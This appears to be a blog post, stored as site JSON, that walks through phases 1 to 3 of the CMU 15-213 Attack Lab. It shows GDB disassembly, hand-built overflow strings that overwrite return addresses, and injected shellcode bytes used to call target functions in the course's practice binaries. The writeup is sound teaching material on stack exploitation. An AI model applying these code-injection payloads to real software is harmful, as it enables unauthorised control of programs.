{"componentChunkName":"component---src-templates-post-js","path":"/2024-08-01-attack-lab/","result":{"data":{"markdownRemark":{"html":"<h2>Overview</h2>\n<p>A lab assignment from CMU's <a href=\"https://www.cs.cmu.edu/afs/cs/academic/class/15213-f22/www/schedule.html\">15-213 course</a>.</p>\n<p>You can find the assignment <a href=\"https://csapp.cs.cmu.edu/3e/labs.html\">here</a>\nRefer to <a href=\"https://csapp.cs.cmu.edu/3e/attacklab.pdf\">writeup</a></p>\n<p>Note: This is the 64-bit successor to the 32-bit Buffer Lab. Students are given a pair of unique custom-generated x86-64 binary executables, called targets, that have buffer overflow bugs. One target is vulnerable to code injection attacks. The other is vulnerable to return-oriented programming attacks. Students are asked to modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming. This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.</p>\n<h3>Phase 1</h3>\n<p>Running <code class=\"language-text\">disas getbuf</code> inside GDB outputs the following</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">   <span class=\"token number\">0x00000000004017a8</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>     sub    $<span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>rsp\n   <span class=\"token number\">0x00000000004017ac</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>     mov    <span class=\"token operator\">%</span>rsp<span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>rdi\n   <span class=\"token number\">0x00000000004017af</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">7</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>     callq  <span class=\"token number\">0x401a40</span> <span class=\"token operator\">&lt;</span>Gets<span class=\"token operator\">></span>\n   <span class=\"token number\">0x00000000004017b4</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    mov    $<span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>eax\n   <span class=\"token number\">0x00000000004017b9</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">17</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    add    $<span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>rsp\n   <span class=\"token number\">0x00000000004017bd</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">21</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    retq</code></pre></div>\n<p>We can see that <code class=\"language-text\">0x28</code> (40) bytes has been allocated for <code class=\"language-text\">getbuf</code>.<br>\n(struggled here because I assumed 0x28 was 28 bytes.)\nWe have to pad 40 bytes followed by the return address\n<code class=\"language-text\">disas touch1</code></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">Dump of assembler code <span class=\"token keyword\">for</span> function touch1<span class=\"token operator\">:</span>\n   <span class=\"token number\">0x00000000004017c0</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>     sub    $<span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>rsp\n   <span class=\"token number\">0x00000000004017c4</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>     movl   $<span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x202d0e</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>rip<span class=\"token punctuation\">)</span>        # <span class=\"token number\">0x6044dc</span> <span class=\"token operator\">&lt;</span>vlevel<span class=\"token operator\">></span>\n   <span class=\"token number\">0x00000000004017ce</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">14</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    mov    $<span class=\"token number\">0x4030c5</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>edi\n   <span class=\"token number\">0x00000000004017d3</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">19</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    callq  <span class=\"token number\">0x400cc0</span> <span class=\"token operator\">&lt;</span>puts@plt<span class=\"token operator\">></span>\n   <span class=\"token number\">0x00000000004017d8</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">24</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    mov    $<span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>edi\n   <span class=\"token number\">0x00000000004017dd</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">29</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    callq  <span class=\"token number\">0x401c8d</span> <span class=\"token operator\">&lt;</span>validate<span class=\"token operator\">></span>\n   <span class=\"token number\">0x00000000004017e2</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">34</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    mov    $<span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>edi\n   <span class=\"token number\">0x00000000004017e7</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token number\">39</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    callq  <span class=\"token number\">0x400e40</span> <span class=\"token operator\">&lt;</span>exit@plt<span class=\"token operator\">></span></code></pre></div>\n<p>The return address should be <code class=\"language-text\">0x00000000004017c0</code>.\nWe add the following to <code class=\"language-text\">input.txt</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\nc0 17 40 00 00 00 00 00</code></pre></div>\n<p>Then we run <code class=\"language-text\">./hex2raw &lt; input.txt > output.txt</code>\nFollowed by, <code class=\"language-text\">./ctarget -q &lt; output.txt</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Cookie: 0x59b997fa\nType string:Touch1!: You called touch1()\nValid solution for level 1 with target ctarget</code></pre></div>\n<h3>Phase 2</h3>\n<p>Writeup mentions that an argument (<code class=\"language-text\">%rdi</code>) is passed to <code class=\"language-text\">touch2</code>.<br>\nWe have to pass cookie as an argument to <code class=\"language-text\">touch2</code> i.e., store value in <code class=\"language-text\">cookie.txt</code> in <code class=\"language-text\">%rdi</code></p>\n<p>So what we are planning to do here is to</p>\n<ol>\n<li>obviously overflow the buffer</li>\n<li>store our cookie in <code class=\"language-text\">%rdi</code></li>\n<li>call <code class=\"language-text\">touch2</code></li>\n</ol>\n<p>step 1 is straightforward, so is 3 (we can just overwrite the return address). but what about step 2?</p>\n<p><strong>How do we execute this code?</strong></p>\n<ol>\n<li>Basically we have to put our exploit code in the buffer (will explain this)</li>\n<li>Pad the rest</li>\n<li>Overwrite the return address to the start of the buffer (this way our exploit code gets executed)</li>\n</ol>\n<p><img src=\"attack-lab-buffer-overflow.JPG\" alt=\"buffer-overflow-code-injection\"></p>\n<p>sample input.txt</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">exploit code // stored cookie in %rdi\npadding\naddress to start of buffer (%rsp) // exploit code gets executed\naddress to touch 2 // executes touch2 with cookie as argument</code></pre></div>\n<p><strong>generating exploit code</strong>\nWrite the following into <code class=\"language-text\">p2.s</code></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">mov $<span class=\"token number\">0x59b997fa</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>rdi <span class=\"token comment\">//value of cookie read from cookie.txt is stored in rdi</span>\nretq</code></pre></div>\n<p>execute the following</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">gcc -c p2.s\nobjdump -d p2.o > p2.d</code></pre></div>\n<p>We get the following disassemble code</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token number\">0000000000000000</span> <span class=\"token operator\">&lt;</span><span class=\"token punctuation\">.</span>text<span class=\"token operator\">></span><span class=\"token operator\">:</span>\n   <span class=\"token number\">0</span><span class=\"token operator\">:</span> <span class=\"token number\">48</span> c7 c7 fa <span class=\"token number\">97</span> b9 <span class=\"token number\">59</span>      mov    $<span class=\"token number\">0x59b997fa</span><span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>rdi\n   <span class=\"token number\">7</span><span class=\"token operator\">:</span> c3                        retq</code></pre></div>\n<p>We now have the byte representation of our exploit code. <code class=\"language-text\">48 c7 c7 fa 97 b9 59 c3</code>\nMake sur <code class=\"language-text\">c3</code> is included. I thought the byte representation had to be in little-endian but that's not necessary. Pad the remaining 32 bytes with 0s.</p>\n<p>To get address of start of buffer, run the program in gdb. get the address of <code class=\"language-text\">%rsp</code> before it exits <code class=\"language-text\">getbuf</code>. Add the address to <code class=\"language-text\">input.txt</code> in little-endian.\nTo get address of touch2, run <code class=\"language-text\">disas touch2</code> in gdb, the address of the first instruction is what we want. Add the address to <code class=\"language-text\">input.txt</code> in little-endian.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"> 48 c7 c7 fa 97 b9 59 c3\n 00 00 00 00 00 00 00 00\n 00 00 00 00 00 00 00 00\n 00 00 00 00 00 00 00 00\n 00 00 00 00 00 00 00 00\n 78 dc 61 55 00 00 00 00\n ec 17 40 00 00 00 00 00</code></pre></div>\n<h3>Phase 3</h3>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">hexmatch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> val<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>sval<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> cbuf<span class=\"token punctuation\">[</span><span class=\"token number\">110</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* Make position of check string unpredictable */</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token operator\">=</span> cbuf <span class=\"token operator\">+</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%.8x\"</span><span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">strncmp</span><span class=\"token punctuation\">(</span>sval<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><code class=\"language-text\">unsigned val</code> is <code class=\"language-text\">unsigned int</code> parameter\n<code class=\"language-text\">s</code> is set to point at a random position within the first 100 bytes of <code class=\"language-text\">cbuf</code>.\n<code class=\"language-text\">sprintf</code> writes the hex representation of <code class=\"language-text\">val</code> at position pointed by <code class=\"language-text\">s</code>\n<code class=\"language-text\">strncmp</code> compares 9 bytes of <code class=\"language-text\">sval</code> and <code class=\"language-text\">val</code>. Returns 0 if strings are equal. <code class=\"language-text\">hexmatch</code> returns 1 if strings are equal.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">touch3</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>sval<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tvlevel <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Part of validation protocol */</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">hexmatch</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">,</span> sval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Touch3!: You called touch3(\\\"%s\\\")\\n\"</span><span class=\"token punctuation\">,</span> sval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Misfire: You called touch3(\\\"%s\\\")\\n\"</span><span class=\"token punctuation\">,</span> sval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fail</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>We have to pass <code class=\"language-text\">cookie</code> in <code class=\"language-text\">%rdi</code> by writing it into the exploit string. Write only the eight hex digits. No <code class=\"language-text\">0x</code>. Terminate with <code class=\"language-text\">00</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">cookie + 00\nexploit code // mov (%rsp), %rdi ; %rdi = cookie\npadding\naddr to exploit code // %rsp + 8\naddr to touch 3</code></pre></div>\n<h3>Things to Remember</h3>\n<ul>\n<li>stack structure\n<ul>\n<li>arguments are pushed to caller's stack frame in reverse order</li>\n<li>return address is pushed to stack, also executes <code class=\"language-text\">call</code> instruction</li>\n<li><code class=\"language-text\">ebp</code> of P is pushed to stack by Q</li>\n<li><code class=\"language-text\">esp</code> is stored in <code class=\"language-text\">ebp</code>. current stack pointer is set as Q's base pointer.</li>\n<li><code class=\"language-text\">ebp</code> of callee is used as reference point to access arguments</li>\n<li><code class=\"language-text\">esp</code> is decremented to allocated space</li>\n</ul>\n</li>\n<li>exploits\n<ul>\n<li>consider buffer of size N is allocated.</li>\n<li>put exploit code in buffer. (assume exploit code fits in buffer)</li>\n<li>pad remaining with garbage</li>\n<li>overflow buffer by overwriting <code class=\"language-text\">return address</code> with start of exploit code.</li>\n</ul>\n</li>\n<li>misc\n<ul>\n<li><code class=\"language-text\">ret</code> pops return address from stack and jumps to address</li>\n<li><code class=\"language-text\">mov esp, ebp</code> > <code class=\"language-text\">pop ebp</code> > <code class=\"language-text\">ret</code></li>\n</ul>\n</li>\n</ul>","frontmatter":{"title":"Attack Lab","date":"2024-08-01T00:00:00.000Z"}}},"pageContext":{"slug":"/2024-08-01-attack-lab/"}},"staticQueryHashes":[],"slicesMap":{}}